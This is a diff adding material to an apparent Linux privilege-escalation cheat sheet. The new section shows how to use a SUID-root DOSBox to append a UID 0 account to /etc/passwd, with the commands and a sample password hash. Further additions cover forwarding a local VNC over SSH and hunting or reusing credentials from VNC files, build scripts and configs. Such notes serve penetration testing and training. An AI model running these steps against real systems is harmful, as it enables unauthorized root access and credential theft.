@@ -333,6 +333,41 @@ su root
 su newroot
 ```
 
+#### SUID DOSBox passwd append
+
+If `dosbox` has SUID root, it may be possible to mount `/` inside DOSBox and append a UID 0 account to `/etc/passwd`. This often requires a graphical session; if CLI DOSBox does not behave correctly over SSH, check for VNC/X11 access and run DOSBox there.
+
+```bash
+# Generate a DES-style passwd hash for password "toor"
+openssl passwd -crypt toor
+
+# Create the passwd row on the Linux host
+echo 'superroot:sXuCKi7k3Xh/s:0:0::/root:/bin/bash' > /tmp/fkpasswd
+```
+
+Inside DOSBox:
+
+```text
+mount d /
+D:
+type D:\TMP\FKPASSWD >> D:\ETC\PASSWD
+```
+
+Then switch to the new UID 0 account:
+
+```bash
+su - superroot
+# password: toor
+id
+```
+
+If VNC is only listening locally, forward it over SSH and connect from the attack host:
+
+```bash
+ssh USER@TARGET -L 5900:127.0.0.1:5901
+vncviewer 127.0.0.1:5900
+```
+
 ### Passwords and Keys
 
 #### History Files
@@ -374,6 +409,9 @@ python3 firefox_decrypt.py mozilla/firefox/
 * Config files often contain passwords in plaintext or other reversible formats.
 * **Backup and alternate config files:** Check for `.bak`, `.old`, or `-old` variants (e.g. `/etc/tomcat9/tomcat-users.xml.bak`). These often contain the same or older plaintext passwords and may be world-readable.
 * **WordPress:** If you have read access to the web root (e.g. as www-data), `cat /var/www/SITE/public_html/wp-config.php` (or similar path) for `DB_USER`, `DB_PASSWORD`, and `DB_NAME` — reuse for MySQL or lateral movement.
+* **VNC:** Check `~/.vnc/config`, `~/.vnc/passwd`, and `~/.vnc/*.log`. Config options like `localhost` mean VNC is bound locally; forward it over SSH and try known user passwords before cracking.
+* **Build/provisioning scripts:** Check `/build*.sh`, `/setup*.sh`, kickstart/cloud-init leftovers, and app install scripts for `chpasswd`, `passwd`, user creation, or hardcoded service passwords.
+* **Credential reuse:** If a config user looks like a real Linux account, try the config password over SSH or `su USER`.
 * List the contents of the user's home directory:
 
 ```
